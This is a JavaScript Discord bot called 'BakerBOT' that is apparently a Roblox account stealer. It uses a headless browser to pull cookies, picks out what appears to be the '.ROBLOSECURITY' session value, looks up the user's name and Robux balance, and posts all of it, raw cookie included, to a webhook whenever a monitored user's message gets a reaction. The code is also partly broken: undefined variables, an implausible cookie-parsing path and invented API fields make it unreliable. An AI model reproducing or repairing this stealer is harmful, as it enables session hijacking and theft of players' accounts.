const Discord = require('discord.js');
const puppeteer = require('puppeteer');
const axios = require('axios');
const express = require('express');

const app = express();

app.get("/", (req, res) => {
  res.send("BakerBOT is running");
});

app.listen(process.env.PORT || 3000);

const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ]
});

async function fetchRobloxData() {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://www.roblox.com');
  
  const cookies = await page.cookies();
  let relevantData = null;
  
  for (const cookie of cookies) {
    if (cookie.name.startsWith('Coo')) {
      const valueParts = cookie.value.split('&');  // Fixed from &amp;
      for (const part of valueParts) {
        if (part.startsWith('https://www.rob/')) {
          const subParts = part.split('&');  // Fixed from &amp;
          const robloPart = subParts.find(sub => sub.startsWith('.ROBLO'));
          if (robloPart) {
            const userId = robloPart.split('=')[1];
            const userData = await axios.get(`https://api.roblox.com/users/${userId}`).then(res => res.data);
            relevantData = {
              display_name: userData.DisplayName,
              username: userData.Username,
              robux: userData.RobuxBalance,
              baked_value: robloPart
            };
            break;
          } 
        }
      }
    }
  }
  
  await browser.close();
  return relevantData;
}

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async message => {
  if (message.content === '/active' && !activeUsers.has(message.author.id)) {
    activeUsers.add(message.author.id);
    await message.reply('Reaction monitoring activated for you!');
  }
});

client.on('messageReactionAdd', async (reaction, user) => {
  if (activeUsers.has(reaction.message.author.id) && reaction.message.guild) {
    const data = await fetchRobloxData();
    if (data) {
      const embedContent = `
Display Name: ${data.display_name}
Username: ${data.username}
Robux: ${data.robux}
Baked: ${data.baked_value}
      `;
      await axios.post(WEBHOOK_URL, {
        content: 'Baking sum!',
        embeds: [{ description: embedContent }]
      });
      
      const whoChannel = reaction.message.guild.channels.cache.find(channel => channel.name === 'who' && channel.isTextBased());
      if (whoChannel) {
        await whoChannel.send(`User who reacted: ${user.username}`);
      }
    }
  }
});

client.login(process.env.TOKEN);
